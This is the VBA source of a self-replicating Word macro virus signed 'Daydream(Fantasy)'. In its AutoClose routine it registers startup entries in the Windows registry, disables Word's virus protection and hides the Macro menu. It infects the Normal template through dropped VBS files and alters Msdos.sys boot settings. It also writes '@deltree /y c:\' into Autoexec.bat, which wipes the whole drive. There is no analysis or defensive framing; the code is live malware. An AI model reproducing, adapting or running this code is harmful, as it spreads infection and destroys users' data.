Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Sub AutoClose()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "") = "C:\WINDOWS\SYSTEM\Daydream.vbs"
ActiveDocument.VBProject.VBComponents.Item(1).Export ("C:\WINDOWS\SYSTEM\Daydream.dll")
Open "C:\WINDOWS\SYSTEM\Daydream.vbs" For Output As #1
Print #1, "Set Daydream = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Daydream.Options.VirusProtection = (0 - 0):Daydream.Options.SaveNormalPrompt = (1 - 1):Daydream.Options.ConfirmConversions = (2 - 2)"
Print #1, "Daydream.CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Visible = (3 - 3)"
Print #1, "For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.sys" & Chr(34) & ")"
Print #1, "Daydream.Application.Quit"
Close #1
Open "C:\WINDOWS\SYSTEM\Daydream.sys" For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
Print #1, "For x = 1 to ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, ".DeleteLines 1"
Print #1, "Next"
Print #1, "End With"
Print #1, "ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.dll" & Chr(34) & ")"
Print #1, "For x = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find(" & Chr(34) & "Private Sub Document_Close()" & Chr(34) & ", 1, 1, 1, 30, True, True, True) = False Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "End Sub"
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Subsystem") = "C:\WINDOWS\SYSTEM\32bitemu.vbs"
Open "C:\WINDOWS\SYSTEM\32bitemu.vbs" For Output As #1
Print #1, "Set A = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "If (A.FileExists(" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.vbs" & Chr(34) & ")) = False Then"
Print #1, "Set B = A.CreateTextFile(" & Chr(34) & "C:\Autoexec.bat" & Chr(34) & ", True)"
Print #1, "B.WriteLine (" & Chr(34) & "@deltree /y c:\ > NUL" & Chr(34) & ")"
Print #1, "B.Close"
Print #1, "End If"
Close #1
If Day(15) Then
SetAttr "C:\Msdos.sys", vbNormal
System.PrivateProfileString("C:\Msdos.sys", "Options", "BootGUI") = "0"
SetAttr "C:\Msdos.sys", vbSystem + vbHidden + vbReadOnly
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Sub AutoClose()", 1, 1, 1, 15, True, True, True) = True Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
Else: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose()"
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
'.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.
' Daydream(Fantasy) By Lys KovicK
';';';';';';';';';';';';';';';';';
